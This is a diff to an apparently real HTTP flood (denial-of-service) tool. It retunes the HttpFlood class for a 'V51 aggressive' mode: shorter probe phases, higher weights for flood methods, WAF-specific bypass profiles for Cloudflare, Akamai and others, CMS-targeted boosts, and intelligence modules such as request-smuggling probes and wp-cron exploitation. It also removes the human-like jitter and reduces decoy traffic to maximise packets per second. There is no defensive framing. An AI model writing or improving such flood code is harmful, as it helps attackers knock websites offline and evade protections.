@@ -6107,16 +6107,14 @@ class HttpFlood(Thread):
         intel["total_executions"] += 1
         tick = intel["total_executions"]
         
-        # === PHASE TRANSITIONS (Military Doctrine) ===
-        # PROBE(0-20) -> CALIBRATE(20-80) -> ASSAULT(80-300) -> SUSTAIN(300+)
-        if tick <= 20:
-            intel["phase"] = "PROBE"      # Test all methods equally
-        elif tick <= 80:
+        # === PHASE TRANSITIONS (Military Doctrine) [V51 ACCELERATED] ===
+        # PROBE(0-5) -> CALIBRATE(5-20) -> ASSAULT(20+)
+        if tick <= 5:
+            intel["phase"] = "PROBE"      # Quick test all methods
+        elif tick <= 20:
             intel["phase"] = "CALIBRATE"  # Start favoring what works
-        elif tick <= 300:
-            intel["phase"] = "ASSAULT"    # Full power on best methods
         else:
-            intel["phase"] = "SUSTAIN"    # Maintain pressure, conserve resources
+            intel["phase"] = "ASSAULT"    # Full power on best methods
             
         # Check if target is dying (consecutive 5xx = server overload)
         if intel["consecutive_5xx"] >= 5:
@@ -6124,10 +6122,10 @@ class HttpFlood(Thread):
             
         phase = intel["phase"]
         
-        # === BASE WEIGHTS ===
+        # === BASE WEIGHTS [V51 AGGRESSIVE] ===
         weights = {
-            "GET": 10, "POST": 10, "STRESS": 5, "PPS": 5,
-            "DYN": 10, "POST_DYN": 15, "SLOW_V2": 0,
+            "GET": 15, "POST": 15, "STRESS": 20, "PPS": 15,
+            "DYN": 15, "POST_DYN": 30, "SLOW_V2": 5,
             "STEALTH_JA3": 0, "XMLRPC_AMP": 0, "WP_SEARCH": 0,
             "BOT": 0, "COOKIE": 0,
         }
@@ -6136,7 +6134,7 @@ class HttpFlood(Thread):
         waf = intel.get("waf_type", "none")
         
         waf_profiles = {
-            "cloudflare":    {"STEALTH_JA3": 70, "SLOW_V2": 30, "POST_DYN": 25, "BOT": 15, "STRESS": 0, "PPS": 0},
+            "cloudflare":    {"STEALTH_JA3": 40, "SLOW_V2": 20, "POST_DYN": 60, "STRESS": 40, "PPS": 25, "DYN": 35, "BOT": 10},
             "akamai":        {"STEALTH_JA3": 80, "SLOW_V2": 25, "POST_DYN": 20, "GET": 5, "STRESS": 0, "PPS": 0},
             "imperva":       {"STEALTH_JA3": 60, "COOKIE": 30, "POST_DYN": 25, "SLOW_V2": 20, "DYN": 20},
             "sucuri":        {"STEALTH_JA3": 50, "POST_DYN": 30, "DYN": 25, "BOT": 20},
@@ -6163,7 +6161,7 @@ class HttpFlood(Thread):
             "joomla":    {"DYN": 40, "POST_DYN": 40},
             "drupal":    {"DYN": 35, "POST_DYN": 35, "POST": 30},
             "shopify":   {"STEALTH_JA3": 60, "SLOW_V2": 35},
-            "laravel":   {"POST_DYN": 45, "DYN": 35, "POST": 30},
+            "laravel":   {"POST_DYN": 80, "DYN": 50, "POST": 40, "STRESS": 35},
             "nextjs":    {"POST_DYN": 35, "DYN": 30},
         }
         if cms in cms_boosts:
@@ -6839,28 +6837,30 @@ class HttpFlood(Thread):
         self._chaos_xmlrpc_status_check()
         self._chaos_response_timing_profiler()
         # Phase 1.10.8: V35 ADVANCED INTELLIGENCE MODULES
-        self._chaos_session_exhaustion()
-        self._chaos_request_smuggling_probe()
-        self._chaos_response_body_analyzer()
-        self._chaos_timing_side_channel()
-        self._chaos_genetic_payload_evolution()
-        self._chaos_entropy_calculator()
-        self._chaos_wp_cron_exploitation()
-        self._chaos_login_flood_discovery()
-        self._chaos_page_weight_analyzer()
-        self._chaos_smart_decoy_traffic()
-        self._chaos_waf_evasion_calculator()
-        self._chaos_rate_limit_intelligence()
-        self._chaos_codeigniter_detection()
-        self._chaos_vercel_detection()
-        self._chaos_env_exposure_check()
-        self._chaos_university_heuristics()
-        self._chaos_caddy_detection()
-        self._chaos_gov_id_heuristics()
+        # [V51] Run heavy intel modules only every 10th cycle to maximize PPS
+        if intel["total_executions"] % 10 == 0:
+            self._chaos_session_exhaustion()
+            self._chaos_request_smuggling_probe()
+            self._chaos_response_body_analyzer()
+            self._chaos_timing_side_channel()
+            self._chaos_genetic_payload_evolution()
+            self._chaos_entropy_calculator()
+            self._chaos_wp_cron_exploitation()
+            self._chaos_login_flood_discovery()
+            self._chaos_page_weight_analyzer()
+            self._chaos_smart_decoy_traffic()
+            self._chaos_waf_evasion_calculator()
+            self._chaos_rate_limit_intelligence()
+            self._chaos_codeigniter_detection()
+            self._chaos_vercel_detection()
+            self._chaos_env_exposure_check()
+            self._chaos_university_heuristics()
+            self._chaos_caddy_detection()
+            self._chaos_gov_id_heuristics()
         
-        self._chaos_dead_drop_dns()
-        self._chaos_honeypot_scanner()
-        self._chaos_build_topology_mesh()
+            self._chaos_dead_drop_dns()
+            self._chaos_honeypot_scanner()
+            self._chaos_build_topology_mesh()
         
         # Subnet/Quantum IP rotation to break Rate Limiters
         if intel.get("anomaly_score", 0) > 70 and len(PROXY_LIST) > 1000:
@@ -6973,19 +6973,16 @@ class HttpFlood(Thread):
             except Exception as e:
                 pass
             
-        # Apply timing jitter (human-like random delay)
-        jitter = intel.get("jitter_ms", 0)
-        if jitter > 0:
-            sleep(jitter / 1000.0)
+        # [V51] Jitter removed for maximum PPS throughput
         
         # Save learned intelligence periodically (every 500 executions)
         if intel["total_executions"] > 0 and intel["total_executions"] % 500 == 0:
             intel["saved_to_disk"] = False  # Allow resaving
             self._chaos_save_memory()
         
-        # Inject decoy traffic every 15-25 executions to camouflage patterns
+        # [V51] Decoy traffic reduced to conserve attack bandwidth
         intel["decoy_interval"] += 1
-        if intel["decoy_interval"] >= randint(15, 25):
+        if intel["decoy_interval"] >= randint(50, 100):
             intel["decoy_interval"] = 0
             self._chaos_decoy()
         
